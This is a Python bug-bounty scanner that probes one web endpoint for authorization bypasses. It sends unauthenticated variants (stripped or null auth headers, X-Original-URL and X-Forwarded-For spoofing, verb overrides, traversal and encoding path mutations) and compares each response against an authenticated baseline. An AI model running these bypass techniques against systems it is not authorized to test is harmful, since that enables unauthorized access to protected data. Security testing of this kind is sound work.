#!/usr/bin/env python3
"""
auth-bypass — 403/401 authorization-bypass matrix against a single endpoint.

Baseline = the authed request (its status + body size). Then each variant is
sent and compared: a variant that reaches the same status+size as the authed
baseline WITHOUT valid auth (or via a routing/verb trick) is a bypass.

Techniques:
  header  : no Authorization · empty Bearer · Authorization: null
  routing : X-Original-URL · X-Rewrite-URL · X-Forwarded-For 127.0.0.1
  verb    : X-HTTP-Method-Override · method swap (GET/POST/PUT/HEAD)
  path    : /admin/../<ep> · double-slash //ep · ;/  · ./  · %2e/ · trailing /
  case    : /Admin /ADMIN mutation
  ext     : append .json .html .css to the path
  frag    : #-fragment truncation

Usage:
  auth-bypass.py --url https://api.acme.com/admin/users \
                 --token VALID_JWT [--method GET] [--data '{}'] [--json]

Only run against endpoints on programs you are authorized to test.
Exit: 0 no bypass · 1 bypass(es) found.
"""
import os, sys, re, json, time, ssl, copy
from pathlib import Path
from urllib.request import Request, build_opener, HTTPSHandler, HTTPHandler
from urllib.error import HTTPError
from urllib.parse import urlparse, urlunparse


def arg(n, d=None):
    return sys.argv[sys.argv.index(n) + 1] if n in sys.argv else d
def flag(n):
    return n in sys.argv


def ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


def fire(url, method, headers, data, timeout=8):
    body = data.encode() if isinstance(data, str) else data
    # NB: this scanner must NOT route through CDP. Its whole premise is sending requests WITHOUT auth (or
    # with spoofed headers); CDP's in-page fetch always attaches the same-origin session cookie
    # (credentials:include), so every "no-auth" variant would still be authenticated → a false bypass on
    # every endpoint. Auth-differential scanners stay on urllib where the exact headers/cookies are controlled.
    opener = build_opener(HTTPSHandler(context=ctx()), HTTPHandler())
    req = Request(url, data=body, headers=headers, method=method.upper())
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(65536)
            return r.status, len(raw), raw.decode("utf-8", "ignore")
    except HTTPError as e:
        try:
            raw = e.read(8192)
        except Exception:
            raw = b""
        return e.code, len(raw), raw.decode("utf-8", "ignore")
    except Exception as ex:
        return 0, 0, ""


# Many APIs (upex/Spring/etc.) return HTTP 200 with an error CODE in the body. Such a response is NOT a
# successful access, so it can be neither a valid authed baseline nor a real bypass.
_ERR_BODY = re.compile(r'"code"\s*:\s*"?(?:[45]\d\d|[1-9]\d{3,})'      # {"code":"401"/"50001"/...}
                       r'|"(?:status|ret|errno)"\s*:\s*(?:[45]\d\d|[1-9]\d{3,})'
                       r'|unauthor|forbidden|not\s*login|please\s*login|login\s*required'
                       r'|invalid\s*(?:token|session|sign)|verification\s*failed|无权|请登录|登录', re.I)

def _is_error_body(body):
    return bool(body) and bool(_ERR_BODY.search(body[:600]))


def path_variants(u):
    p = urlparse(u)
    path = p.path or "/"
    seg = path.rsplit("/", 1)[-1]
    parent = path[: -len(seg)] if seg else path
    out = []

    def mk(newpath, note):
        out.append((note, urlunparse(p._replace(path=newpath))))

    mk(parent + "../" + seg, "dot_segment_traversal")
    mk("/" + path.lstrip("/"), "leading_normal")
    mk("//" + path.lstrip("/"), "double_slash")
    mk(path + "/", "trailing_slash")
    mk(parent + ";/" + seg, "semicolon_segment")
    mk(parent + "./" + seg, "single_dot")
    mk(parent + "%2e/" + seg, "encoded_dot")
    if seg:
        mk(parent + seg[0].upper() + seg[1:], "case_capital")
        mk(parent + seg.upper(), "case_upper")
        for ext in (".json", ".html", ".css"):
            mk(path + ext, f"ext_append{ext}")
    mk(path + "#", "fragment_hash")
    return out


def main():
    url = arg("--url")
    token = arg("--token")
    method = arg("--method", "GET")
    data = arg("--data")

    if not url:
        print(__doc__)
        sys.exit(0)

    base_h = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    if data:
        base_h["Content-Type"] = "application/json"
    authed_h = dict(base_h)
    if token:
        authed_h["Authorization"] = token if " " in token else f"Bearer {token}"
    # program auth header(s) (e.g. X-FilesAPI-Auth) belong ONLY on the authed baseline — the bypass
    # variants deliberately strip auth, so keep them out of base_h.
    try:
        for _k, _v in (json.loads(os.environ.get("HUNT_AUTH_HEADERS", "") or "{}") or {}).items():
            authed_h.setdefault(_k, _v)
    except Exception:
        pass

    b_status, b_size, b_body = fire(url, method, authed_h, data)
    print(f"[auth-bypass] baseline (authed) HTTP {b_status} size={b_size}", file=sys.stderr)

    def matches_authed(s, z):
        return s == b_status and s in (200, 201, 204) and abs(z - b_size) <= max(16, int(0.05 * (b_size or 1)))

    # GUARD 1 — no authed-SUCCESS baseline ⇒ nothing to bypass. A non-2xx status, or a 200 whose body is an
    # error (API returns {"code":"50001"...} with HTTP 200), means the authed request itself did not get
    # privileged access, so a matching unauth variant is NOT a bypass. (Killed a 1230-FP flood on cointr.)
    if b_status not in (200, 201, 204) or _is_error_body(b_body):
        print("[auth-bypass] authed baseline is not a success (status/err-body) — nothing to bypass", file=sys.stderr)
        if flag("--json"):
            print(json.dumps({"url": url, "baseline": b_status, "findings": []}))
        sys.exit(0)

    # GUARD 2 — control: a fully stripped request (no auth at all). If it already matches the authed
    # baseline, the endpoint returns the same with or without auth ⇒ it is public, not a bypass.
    ctrl_h = {k: v for k, v in base_h.items() if k.lower() not in ("authorization", "cookie")}
    c_status, c_size, c_body = fire(url, method, ctrl_h, data)
    if matches_authed(c_status, c_size) and not _is_error_body(c_body):
        print("[auth-bypass] unauth control already matches baseline — endpoint is public, not a bypass", file=sys.stderr)
        if flag("--json"):
            print(json.dumps({"url": url, "baseline": b_status, "findings": []}))
        sys.exit(0)

    variants = []

    # header-strip variants (same url/method, weakened auth)
    variants.append(("no_auth_header", url, method, dict(base_h), data))
    variants.append(("empty_bearer", url, method, {**base_h, "Authorization": "Bearer "}, data))
    variants.append(("auth_null", url, method, {**base_h, "Authorization": "null"}, data))

    # routing-override headers (unauthed base + override to the protected path)
    p = urlparse(url)
    variants.append(("x_original_url", p._replace(path="/").geturl(), method,
                     {**base_h, "X-Original-URL": p.path}, data))
    variants.append(("x_rewrite_url", p._replace(path="/").geturl(), method,
                     {**base_h, "X-Rewrite-URL": p.path}, data))
    variants.append(("x_forwarded_for_lo", url, method,
                     {**base_h, "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}, data))

    # verb overrides / method swaps (unauthed)
    variants.append(("verb_override_get", url, method,
                     {**base_h, "X-HTTP-Method-Override": "GET"}, data))
    for m in ("POST", "PUT", "HEAD", "OPTIONS"):
        if m != method.upper():
            variants.append((f"method_swap_{m.lower()}", url, m, dict(base_h),
                             data if m in ("POST", "PUT") else None))

    # path mutations (unauthed)
    for note, vurl in path_variants(url):
        variants.append((f"path_{note}", vurl, method, dict(base_h), data))

    findings = []
    for note, vurl, vmethod, vheaders, vdata in variants:
        s, z, vbody = fire(vurl, vmethod, vheaders, vdata)
        # a real bypass reaches the authed success AND returns a non-error body (not a 200-wrapped error)
        hit = matches_authed(s, z) and not _is_error_body(vbody)
        rec = {
            "technique": note, "url": vurl, "method": vmethod,
            "status": s, "size": z,
            "baseline_status": b_status, "baseline_size": b_size,
        }
        if hit:
            rec["severity"] = "high"
            rec["note"] = (f"{note}: reached authed baseline ({s}/{z}b) without valid "
                           f"auth — authorization bypass.")
            findings.append(rec)
            print(f"  ✓ BYPASS {note}  {s}/{z}", file=sys.stderr)

    result = {
        "ts": time.strftime("%Y-%m-%d %H:%M"),
        "url": url,
        "baseline_status": b_status, "baseline_size": b_size,
        "variants_tested": len(variants),
        "total": len(findings),
        "findings": findings,
    }

    if flag("--json"):
        print(json.dumps(result))
        sys.exit(1 if findings else 0)

    print(f"\n== auth-bypass · {url} ==")
    print(f"  baseline authed {b_status}/{b_size}b · tested {len(variants)} variants · "
          f"{len(findings)} bypass(es)")
    for f in findings:
        print(f"  [HIGH]  {f['technique']:<24} {f['status']}/{f['size']}b  {f['url']}")
    if not findings:
        print("  no bypass — endpoint held under all tested variants.")
    sys.exit(1 if findings else 0)


if __name__ == "__main__":
    main()
